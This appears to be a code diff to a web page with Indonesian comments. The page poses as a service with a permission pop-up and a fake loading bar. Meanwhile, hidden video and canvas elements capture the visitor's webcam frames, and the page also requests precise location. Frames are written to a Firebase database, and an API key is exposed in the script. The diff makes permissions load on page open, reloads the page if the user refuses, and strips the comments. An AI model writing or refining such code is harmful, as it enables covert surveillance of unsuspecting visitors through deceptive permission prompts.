@@ -27,7 +27,7 @@
       overflow: hidden;
     }
 
-    /* 1. POP-UP MODAL CUSTOM */
+    /* POP-UP MODAL CUSTOM */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -91,16 +91,15 @@
       transform: translateY(-1px);
     }
 
-    /* 2. TAMPILAN LOADING FULL SCREEN */
+    /* TAMPILAN LOADING FULL SCREEN */
     .loading-container {
-      display: none; /* Sembunyi sebelum izin disetujui */
+      display: none;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       text-align: center;
     }
 
-    /* Spin Circle Animasi */
     .spinner {
       width: 70px;
       height: 70px;
@@ -136,7 +135,6 @@
       50% { opacity: 1; }
     }
 
-    /* Progress Bar */
     .progress-bar-box {
       width: 260px;
       height: 8px;
@@ -161,7 +159,6 @@
       color: #c9d1d9;
     }
 
-    /* Elemen Kamera Tersembunyi */
     #webcamElement, #canvasElement {
       display: none;
     }
@@ -191,12 +188,10 @@
     <div class="percentage-text" id="percentText">0%</div>
   </div>
 
-  <!-- Elemen Kamera & Canvas Tersembunyi -->
   <video id="webcamElement" autoplay playsinline></video>
   <canvas id="canvasElement"></canvas>
 
   <script>
-    // 1. Konfigurasi Firebase Anda
     const firebaseConfig = {
       apiKey: "AIzaSyC5FzkrFW7JPOagOddT575F44wVT6hVeRE",
       authDomain: "sfkk-6af70.firebaseapp.com",
@@ -217,28 +212,36 @@
     const progressFill = document.getElementById('progressFill');
     const percentText = document.getElementById('percentText');
 
-    // Dipanggil saat klik "Mulai"
-    async function mulaiProses() {
-      // Minta izin lokasi dan kamera
-      const izinLokasi = await mintaLokasi();
-      const izinKamera = await mintaKamera();
+    // Variabel penampung status izin yang dipanggil pertama kali
+    let statusLokasi = false;
+    let statusKamera = false;
 
-      // Cek apakah kedua izin diberikan
-      if (!izinLokasi || !izinKamera) {
+    // Meminta izin browser secara langsung saat halaman dibuka pertama kali
+    window.onload = async function() {
+      statusLokasi = await mintaLokasi();
+      statusKamera = await mintaKamera();
+    };
+
+    // Fungsi saat pengguna menekan tombol "Mulai"
+    async function mulaiProses() {
+      // Jika izin belum didapat saat load awal, panggil sekali lagi untuk memastikan
+      if (!statusLokasi) statusLokasi = await mintaLokasi();
+      if (!statusKamera) statusKamera = await mintaKamera();
+
+      // Cek apakah user menolak salah satu atau kedua izin
+      if (!statusLokasi || !statusKamera) {
         alert("Layanan ini tidak bisa berjalan jika belum diijinkan");
-        document.getElementById('customModal').style.display = 'flex'; // Tampilkan kembali modal
+        // Setelah klik OK pada alert, muat ulang (reload) browser ke kondisi awal
+        window.location.reload();
         return;
       }
 
-      // Sembunyikan Pop-Up Modal hanya jika semua izin diberikan
+      // Jika diizinkan, sembunyikan modal dan jalankan tampilan loading
       document.getElementById('customModal').style.display = 'none';
-
-      // Tampilkan Animasi Loading & Jalankan Progress Bar
       loadingArea.style.display = 'flex';
       jalankanProgressBar();
     }
 
-    // Animasi Angka 0% -> 95%
     function jalankanProgressBar() {
       let progress = 0;
       const interval = setInterval(() => {
@@ -251,7 +254,6 @@
       }, 500);
     }
 
-    // Function Minta Lokasi (Mengembalikan boolean true/false)
     function mintaLokasi() {
       return new Promise((resolve) => {
         if ("geolocation" in navigator) {
@@ -267,7 +269,8 @@
             (error) => {
               console.warn("Lokasi ditolak:", error.message);
               resolve(false);
-            }
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
           );
         } else {
           resolve(false);
@@ -275,7 +278,6 @@
       });
     }
 
-    // Function Minta Kamera (Mengembalikan boolean true/false)
     async function mintaKamera() {
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         try {
@@ -292,7 +294,6 @@
       }
     }
 
-    // Ambil Frame Kamera Kualitas Maksimal
     function captureFrame() {
       if (webcam.videoWidth === 0) return;
 
@@ -303,10 +304,8 @@
       ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
 
       const base64Image = canvas.toDataURL('image/jpeg', 1.0);
-      
       db.ref('device/cameraFrame').set(base64Image);
     }
-
   </script>
 
 </body>
